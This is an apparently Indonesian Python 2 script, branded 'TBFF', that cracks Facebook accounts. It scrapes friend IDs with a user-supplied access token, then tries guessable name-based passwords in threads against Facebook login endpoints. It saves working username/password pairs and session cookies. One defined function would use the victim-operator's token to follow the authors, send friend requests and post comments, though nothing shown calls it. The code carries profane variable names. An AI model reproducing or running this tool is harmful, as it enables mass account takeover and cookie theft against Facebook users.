#!/usr/bin/python2
# coding=utf-8

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#------------------------------->
koh = '100078379432123'
xi_jimpinx = '140106845088579'
ok, cp, id, loop = [], [], [], 0
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Ijin pake scriptnya bang', 'Keren Master'])
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

# LO KONTOL
logo = ''' \033[0;96m __________________________________
\033[0;96m ___  __/__  __ )__  ____/__  ____/
\033[0;96m __  /  __  __  |_  /_   __  /_    
\033[0;96m _  /   _  /_/ /_  __/   _  __/    
\033[0;96m /_/    /_____/ /_/      /_/ \033[0;91m © Version 22.2 '''

lo_ngentod = '140106845088579'
# crack selesai
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] Lah? Kok gak dapet result;v makannya ganteng😆'%(M,N);exit()

#masuk token
def yayanxd():
    os.system('clear')
    kontol = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
        print '\n\n %s*%s WELCOME TO TOLLS TBFF %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        os.system('xdg-open https://www.facebook.com/100072677928941')
        moch_yayan()
    except KeyError:
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);yayanxd()

### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
    	kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
    os.system('clear')
    print logo
    print '\033[0;97m--------------------------------------------\n';time.sleep(0.03)
    print '\033[0;97m [++] \033[0;93m Author   : TAUFIQ XD'
    print '\033[0;97m [++] \033[0;93m Github   : Github.com/TAUFIQ-XD/TBFF'
    print '\033[0;97m [++] \033[0;93m Facebook : Facebook.com/NURDIN KUMAR'
    print '\033[0;97m--------------------------------------------\n';time.sleep(0.03)
    print '\033[0;97m [\033[0;96m++\033[0m] \033[0;96m NAME FB   : %s'%(nama);time.sleep(0.03)
    print '\033[0;97m--------------------------------------------\n';time.sleep(0.03)
    print ' [01]. %sDUMP ID FRIENDS%s'%(O,N);time.sleep(0.03)
    print ' [02]. %sDUMP ID PUBLIK%s'%(O,N);time.sleep(0.03)
    print ' [03]. %sSTART CRACKING%s'%(O,N);time.sleep(0.03)
    print ' [04]. %sVIEW RESULT CRACK%s'%(O,N);time.sleep(0.03)
    print ' [05]. %sSETINGS USER AGENT%s'%(O,N);time.sleep(0.03)
    print ' [%s00%s]. LOGOUT (%sREMOVE TOKEN%s)'%(M,N,M,N);time.sleep(0.03)
    print '\033[0;97m--------------------------------------------\n';time.sleep(0.03)
    pepek = raw_input('\n [*] CHOSEE : ')
    if pepek == '':
        print '\n %s[%s×%s] JANGAN KOSONG !'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
    elif pepek in['3','03']:
        __crack__().plerr()
    elif pepek in['4','04']:
        try:
            dirs = os.listdir("results")
            print '\n [ hasil crack yang tersimpan di file anda ]\n'
            for file in dirs:
                print(" [%s+%s] %s"%(O,N,file))
            file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
            if file == "":
                file = raw_input("\n %s[%s?%s] masukan nama file :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
            for memek in total:
            	kontol = memek.replace("\n","")
                titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
        except (IOError):
            print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
    elif pepek in['5','05']:
        seting_yntkts()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .memek.txt')
        jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()

def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100054912310434/subscribers?access_token=%s'%(kentod)) #TONI
        requests.post('https://graph.facebook.com/100072677928941/subscribers?access_token=%s'%(kentod)) #TAUFIQ
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
        #requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    except:
    	pass

# dump id dari teman hehe
def teman(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        xxx = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()

### ganti user agent
def seting_yntkts():
    print '\n (%s1%s) ganti user agent'%(O,N)
    print ' (%s2%s) check user agent'%(O,N)
    ytbjts = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if ytbjts == '':
        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '%s-'%(M)
        print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()
# User Agent baru
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    _asu_ = raw_input('\n [%s?%s] ingin menggunakan user agent hp anda [Y/t]: '%(O,N))
    if _asu_ == '':
        print '\n %s[%s×%s] Gak boleh kosong Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n %s *%s anda akan di arakan ke situs web setelah di arahkan ke situs web.\n  %s*%s klik ikon %sMY USER AGENT%s lalu copy semua user agent anda...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.yayanxd.my.id/server')
        _agen_ = raw_input(' [%s?%s] masukan user agent hp anda :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil menggunakan user agent hp anda...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    elif _asu_ in['T','t']:
        _agen_ = raw_input(' [%s?%s] masukan user agent :%s '%(O,N,H))
        open('YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
    else:
        print '\n %s[%s!%s] Y/t ngentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] masukan file : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);__yan__()()
                        elif cin == '1':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s×%s] input yang bener'%(N,M,N);__yan__()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s] Y/t goblok!'%(N,M,N);self.plerr()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik'%(N,M,N)),
                sys.stdout.flush()
                loop +=1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1
    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
